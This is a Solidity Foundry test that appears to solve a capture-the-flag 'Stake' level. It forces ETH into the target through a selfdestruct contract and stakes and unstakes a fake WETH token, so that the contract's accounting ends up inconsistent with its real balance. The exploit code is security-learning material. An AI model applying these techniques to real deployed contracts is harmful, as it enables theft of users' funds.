// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/level31.sol";
import "../src/FakeWETH.sol";

contract ForceSend {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract StakeExploitTest is Test {
    Stake public stake;
    FakeWETH public weth;
    address public attacker;
    address public attacker3;

    function setUp() public {
        attacker = vm.addr(1);
        attacker3 = vm.addr(2);

        vm.deal(attacker, 1 ether);
        vm.deal(attacker3, 10 ether);

        vm.startPrank(attacker);
        weth = new FakeWETH();
        stake = new Stake(address(weth));
        vm.stopPrank();
    }

    function testExploit3() public {
        vm.startPrank(attacker);

        // 1. Stake fake WETH
        stake.StakeWETH(10 ether);

        // 2. Unstake it => your balance becomes 0
        stake.Unstake(10 ether);

        // 3. Force ETH to contract
        vm.deal(address(this), 1 ether); // Ensure the contract has ETH
        new ForceSend{value: 1 wei}(payable(address(stake)));

        vm.stopPrank();

        // 4. Trigger contract update with another fake stake
        vm.startPrank(attacker3);
        stake.StakeWETH(1 ether);
        vm.stopPrank();

        assertGt(address(stake).balance, 0, "ETH should be in contract");
        assertGt(
            stake.totalStaked(),
            address(stake).balance,
            "totalStaked should be higher than actual ETH"
        );
        assertTrue(stake.Stakers(attacker), "You must be a staker");
        assertEq(stake.UserStake(attacker), 0, "Your balance should be zero");
    }
}
